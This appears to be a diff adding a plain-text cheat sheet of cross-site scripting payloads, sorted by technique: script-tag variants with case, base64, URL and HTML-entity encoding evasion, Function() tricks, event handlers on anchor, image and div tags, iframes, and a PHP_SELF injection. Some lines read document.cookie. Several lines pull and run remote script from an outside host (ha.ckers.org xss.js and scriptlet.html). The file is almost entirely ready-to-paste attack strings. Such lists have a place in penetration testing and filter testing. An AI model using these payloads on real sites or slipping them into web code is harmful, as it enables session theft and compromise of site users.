@@ -1,0 +1,99 @@
+Generic Alerts:
+	<script>alert("XSS");</script>
+	#;<Script>alert("XSS");</script>//
+	<script>alert(document.cookie);</script>
+	<sCript>alert("XSS");</sCRIpt>
+	<sCript>alert("XSS");</SCRIPT>
+	<sCript>prompt(document.cookie);</SCRIPT>
+	<sCript>prompt("prompt_4_username");</SCRIPT>
+	<sCript>confirm("confirm_test");</SCRIPT>
+	PA==scriptPg==alert("XSS");PA==Lw==scriptPg==
+	<scr<script>ipt>alert("XSS");</scr</script>ipt>
+	&lt;script type="text/javascript"&gt;alert("XSS");&lt;/script&gt;
+	PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmFsZXJ0KCJYU1MiKTs8L3NjcmlwdD4=
+	%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%58%53%53%22%29%3b%3c%2f%73%63%72%69%70%74%3e
+	PA==scriptIA==type="text/javascript"Pg==alert("XSS");PA==/scriptPg==
+	PA==scriptIA==type="text/javascript"Pg==prompt("XSS");PA==/scriptPg==
+	Pentest<script%20type="text/javascript">alert(1)</script&lt;Ipt>>erLab
+	&#x3C;&#x53;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x43;&#x52;&#x49;&#x70;&#x74;&#x3E;
+	%3C%53%63%72%69%70%74%3E%70%72%6F%6D%70%74%28%31%29%3C%2F%73%43%52%49%70%74%3E
+	%3C%53%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%43%52%49%70%74%3E
+	';prompt(String.fromCharCode(88,83,83))//';prompt(String.fromCharCode(88,83,83))//";prompt(String.fromCharCode(88,83,83))//";prompt(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT>
+	
+	
+	
+	
+Use FUNCTIONS:
+	<script>Function('a\x6cert("hah_lol")')();</script>
+	["});};]<script>Function('a\x6cert("hah_lol")')();</script>
+
+		
+	
+	
+	
+XSS.js file include from RSnake:
+	<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+	<SCRIPT%20a=">"%20''%20SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+	<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+	<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+	<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+	<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+	<script>eval(unescape(location.href))</script>%20%20%20%20
+	
+	
+	
+IFRAMES:
+	<iframe width="1" height="1" frameborder="0" src="[File location]"></iframe>
+	<iframe width="100" height="300" frameborder="0" src="www.cnn.com"></iframe>
+	&lt;iframe width="100" height="300" frameborder="0" src="www.cnn.com"&gt;&lt;/iframe&gt;
+	<iframe width="300" height="500" frameborder="0" src="www.cnn.com"></iframe>
+	<iframe width="300" height="500" frameborder="0" src="www.cnn.com">This is not so fun!</iframe>
+	<iframe width="200" height="200" frameborder="5" src="www.cnn.com">iFrame Inclusion Test</iframe>
+
+	
+	
+Anchor Tags
+	<a%20href="www.google.com"%20onmouseover=alert(1)>google</a>
+	<a href="www.google.com" onmouseover=alert("JS_is_running")>google</a>
+	<a href="www.google.com" onmouseout=alert('js_is_running')>google</a>
+	<a href="www.google.com" onclick=alert('js_is_running')>google</a>
+	<a href="www.google.com" onload=alert('js_is_running')>google</a>
+	<a href='javascript:alert(1)'>tester</a>
+	<a href='javascript:alert(1)' onmouseover=alert('1')>tester</a>
+	<a href="www.google.com" onload=confirm('js_is_running')>confirm_test</a>
+	<a href="http://www.google.com" onmouseover=confirm("JS_is_running")>confirm_test</a>
+	<A HREF="javascript:document.location='http://www.cnn.com/'">XSS</A>
+	&lt;A HREF="javascript:document.location='http://www.cnn.com/'" onmouseover=alert("JS_is_running")&gt;XSS&lt;/A&gt;
+	<A HREF="javascript:document.location='http://www.cnn.com/'" onmouseover=alert("JS_is_running")>XSS</A>
+	
+	
+	
+Image Tags:
+	<img src='zzzz'onerror='alert("_Hello_")' />
+	<img src='zzzz'onerror='prompt("_Hello_")' />
+	<img src='zzzz' onerror='confirm("_Hello_")' />
+	
+	
+	
+DIV Tags:
+	<div onmouseover=alert("div_tag_JS")>div_tag</div>
+	<div onmouseout=alert("div_tag_JS")>div_tag</div>
+	<div onclick=alert("div_tag_JS")>div_tag</div>
+	<div onmouseover=prompt("Username_please")>div_tag</div>
+	<div onmouseover=confirm("Username_please")>div_tag</div>
+	
+	
+	
+OBJECT Tag:
+	<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+	
+	
+	
+	
+Some old JS Escapes:
+	test";alert(1)</script>//
+	'prompt(1);
+	'alert(1);
+	
+PHP (GET_SELF):
+	echo%20$_SERVER['PHP_SELF'];/%22%3E%3Cscript%3Ealert('xss')%3C/script%3E%3Cfoo
